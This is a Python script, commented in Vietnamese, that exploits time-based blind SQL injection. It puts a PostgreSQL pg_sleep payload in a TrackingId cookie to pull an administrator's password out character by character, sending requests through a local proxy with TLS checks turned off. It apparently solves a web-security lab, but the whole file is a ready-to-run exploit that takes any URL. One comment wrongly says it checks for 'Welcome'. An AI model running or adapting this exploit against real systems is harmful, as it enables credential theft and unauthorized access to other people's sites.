import sys
import requests
import urllib3
import urllib 

# Tắt cảnh báo về các yêu cầu không an toàn
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Cấu hình proxy
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

# Trích xuất mật khẩu của quản trị viên bằng SQL injection.
def sqli_password(url):
    password_extracted = ""
    for i in range(1,21): # Duyệt qua mỗi ký tự trong mật khẩu
        for j in range(32,126): # Duyệt qua mỗi ký tự ASCII từ dấu cách đến dấu "~"
            sql_payload = "' || (select case when (username='administrator' and ascii(substring(password,%s,1))='%s') then pg_sleep(10) else pg_sleep(-1) end from users)--" %(i,j)
            sql_payload_encoded = urllib.parse.quote(sql_payload) # Mã hóa payload SQL injection để tránh các ký tự đặc biệt
            cookies = {'TrackingId': '9Q1Bor7zA6ojh3Dn' +  sql_payload_encoded, 'session': 'hPavvppYEwViE4hF5fHa0sIApsSdFxxs'} 
            r = requests.get(url, cookies=cookies, verify=False, proxies=proxies) # Gửi một yêu cầu HTTP GET tới URL được cung cấp, chứa payload SQL injection trong cookies
            # Kiểm tra xem trang web đã trả về có chứa chuỗi "Welcome" hay không
            if int(r.elapsed.total_seconds()) > 9:
                password_extracted += chr(j)
                sys.stdout.write('\r' + password_extracted)
                sys.stdout.flush()
                break
            else:
                sys.stdout.write('\r' + password_extracted + chr(j))
                sys.stdout.flush()

def main():
    # Kiểm tra xem số lượng đối số dòng lệnh có đúng không
    if len(sys.argv) != 2:
        print("(+) Usage: %s <url>" % sys.argv[0])
        print("(+) Example: %s www.example.com" % sys.argv[0])
        return
    
    url = sys.argv[1]
    print("(+) Đang trích xuất mật khẩu quản trị viên...")
    sqli_password(url) # Trích xuất mật khẩu

if __name__ == "__main__":
	main()
